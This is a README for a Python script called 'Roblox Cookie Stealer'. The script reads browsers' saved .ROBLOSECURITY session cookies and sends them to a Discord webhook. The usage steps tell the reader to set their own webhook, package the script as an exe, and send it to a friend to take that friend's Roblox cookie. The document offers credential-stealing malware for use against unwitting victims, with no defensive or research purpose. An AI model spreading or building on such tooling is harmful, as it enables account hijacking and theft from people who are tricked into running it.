# Roblox Cookie Stealer

I created a simple Python script that steals the ```.ROBLOSECURITY``` cookie since other methods were patched. It uses ```browser_cookie3``` to view all cookies saved from supported browsers. Currently, it works for 3 browsers, but you can easily add more by closing the browser in the script to access the cookies.

## Usage

1. Download the files.
2. Open the ```setup.bat``` file.
3. Open the ```roblox_cookie_stealer.py``` file and change the webhook to your discord webhook in line ```10```.
4. (Optional) Use ```auto_py_to_exe``` to convert the python file to an exe file.
5. Send the file to your friend to get ther roblox cookie.
